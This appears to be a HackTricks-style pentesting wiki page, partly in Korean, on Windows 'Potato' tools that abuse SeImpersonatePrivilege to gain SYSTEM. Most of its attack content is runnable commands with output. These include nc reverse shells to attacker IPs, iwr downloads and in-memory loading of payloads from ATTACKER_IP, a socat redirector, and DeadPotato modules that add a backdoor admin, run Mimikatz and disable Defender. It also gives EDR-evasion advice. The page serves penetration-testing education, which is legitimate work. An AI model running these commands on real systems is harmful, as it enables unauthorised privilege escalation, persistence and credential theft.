# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
운영 노트:

- 쉘이 SeImpersonatePrivilege가 없는 제한된 토큰(일부 상황에서 Local Service/Network Service에 흔함)으로 실행되는 경우, FullPowers를 사용해 계정의 기본 권한을 복원한 뒤 Potato를 실행하세요. 예: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer는 Print Spooler 서비스가 실행 중이며 로컬 RPC 엔드포인트(spoolss)를 통해 접근 가능해야 합니다. PrintNightmare 이후 Spooler가 비활성화된 하드닝된 환경에서는 RoguePotato/GodPotato/DCOMPotato/EfsPotato를 선호하세요.
- RoguePotato는 TCP/135로 접근 가능한 OXID resolver가 필요합니다. egress가 차단되어 있다면 redirector/port-forwarder를 사용하세요(아래 예시 참조). 구버전 빌드에서는 -f 플래그가 필요했습니다.
- EfsPotato/SharpEfsPotato는 MS-EFSR을 악용합니다; 하나의 파이프가 차단되면 대체 파이프(lsarpc, efsrpc, samr, lsass, netlogon)를 시도하세요.
- RpcBindingSetAuthInfo 도중 발생하는 Error 0x6d3은 대개 알 수 없거나 지원되지 않는 RPC 인증 서비스임을 나타냅니다; 다른 파이프/전송을 시도하거나 대상 서비스가 실행 중인지 확인하세요.
- DeadPotato와 같은 "kitchen-sink" 포크는 디스크를 건드리는 추가 페이로드 모듈(Mimikatz/SharpHound/Defender off)을 번들로 포함합니다; 원래의 슬림한 버전보다 EDR 탐지율이 높을 것으로 예상하세요.

## 빠른 데모

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
참고:
- 현재 콘솔에서 대화형 프로세스를 만들려면 -i를 사용하고, 한 줄 명령을 실행하려면 -c를 사용하세요.
- Spooler 서비스가 필요합니다. 비활성화되어 있으면 실패합니다.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
아웃바운드 포트 135가 차단된 경우, redirector에서 socat을 통해 OXID resolver를 pivot하세요:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato는 2022년 말에 공개된 최신 COM 남용 프리미티브로, Spooler/BITS 대신 **PrintNotify** 서비스를 공략합니다. 이 바이너리는 PrintNotify COM 서버를 인스턴스화하고, 가짜 `IUnknown`를 교체한 다음 `CreatePointerMoniker`를 통해 권한 있는 콜백을 유발합니다. PrintNotify 서비스( **SYSTEM** 권한으로 실행 중)가 다시 연결하면, 프로세스는 반환된 토큰을 복제하여 전체 권한으로 지정한 페이로드를 실행합니다.

Key operational notes:

* Print Workflow/PrintNotify 서비스가 설치되어 있는 한 Windows 10/11 및 Windows Server 2012–2022에서 동작합니다(legacy Spooler가 post-PrintNightmare 이후 비활성화된 경우에도 해당 서비스는 존재합니다).
* 호출 컨텍스트가 **SeImpersonatePrivilege**를 보유해야 합니다(일반적으로 IIS APPPOOL, MSSQL, 및 예약 작업 서비스 계정에서 보유).
* 직접 명령 또는 인터랙티브 모드를 허용하여 원래 콘솔에 머물 수 있습니다. 예:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* 순수하게 COM 기반이기 때문에 named-pipe 리스너나 외부 리다이렉터가 필요 없으며, Defender가 RoguePotato의 RPC 바인딩을 차단하는 호스트에서도 즉시 대체 가능한 수단으로 사용할 수 있습니다.

Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
팁: 하나의 pipe가 실패하거나 EDR이 차단하면, 다른 지원되는 pipe를 사용해 보세요:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notes:
- SeImpersonatePrivilege가 존재하는 경우 Windows 8/8.1–11 및 Server 2012–2022에서 작동합니다.
- 설치된 런타임에 맞는 바이너리를 가져오세요 (예: 최신 Server 2022에서는 `GodPotato-NET4.exe`).
- 초기 실행 프리미티브가 짧은 타임아웃을 가진 webshell/UI인 경우, 페이로드를 스크립트로 스테이징하고 긴 인라인 명령 대신 GodPotato에게 그 스크립트를 실행하도록 하세요.

Quick staging pattern from a writable IIS webroot:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato는 기본값으로 RPC_C_IMP_LEVEL_IMPERSONATE을 사용하는 서비스 DCOM 객체를 대상으로 하는 두 가지 변형을 제공합니다. 제공된 바이너리를 빌드하거나 사용한 후 명령을 실행하세요:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (업데이트된 GodPotato 포크)

SigmaPotato는 .NET reflection을 통한 in-memory execution과 PowerShell reverse shell helper 같은 현대적인 편의 기능을 추가합니다.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- 내장된 reverse shell 플래그 `--revshell` 및 1024자 PowerShell 제한 제거로 긴 AMSI-bypassing payloads를 한 번에 전송할 수 있습니다.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), 간단한 휴리스틱을 혼동시키기 위한 기본적인 AV 회피 트릭(`VirtualAllocExNuma()` 사용).
- PowerShell Core 환경을 위해 .NET 2.0을 대상으로 컴파일된 별도의 `SigmaPotatoCore.exe`.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato는 GodPotato의 OXID/DCOM impersonation 체인을 유지하면서 post-exploitation 헬퍼를 내장하여 운영자가 추가 도구 없이 즉시 SYSTEM 권한을 획득하고 persistence/collection을 수행할 수 있게 합니다.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — SYSTEM으로 임의 명령 실행.
- `-rev <ip:port>` — 빠른 reverse shell.
- `-newadmin user:pass` — persistence 용도의 로컬 관리자 생성.
- `-mimi sam|lsa|all` — 자격증명 덤프를 위해 Mimikatz를 디스크에 기록하고 실행함(디스크 흔적, 탐지에 눈에 띔).
- `-sharphound` — SYSTEM 권한으로 SharpHound 수집 실행.
- `-defender off` — Defender 실시간 보호 비활성화(매우 눈에 띔).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
추가 바이너리를 포함하고 있으므로 AV/EDR 탐지율이 더 높습니다; 은밀함이 중요할 경우 더 슬림한 GodPotato/SigmaPotato를 사용하세요.

## 참고자료

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – 서비스 계정의 기본 토큰 권한 복원](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction을 통한 webroot RCE → FullPowers + GodPotato로 SYSTEM 권한 획득](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato로 SYSTEM 권한 획득](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: 은밀한 공격 작전의 릴레이 네트워크와 내부 작동 방식 공개](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – 내장 post-ex 모듈을 포함한 GodPotato 재구성](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
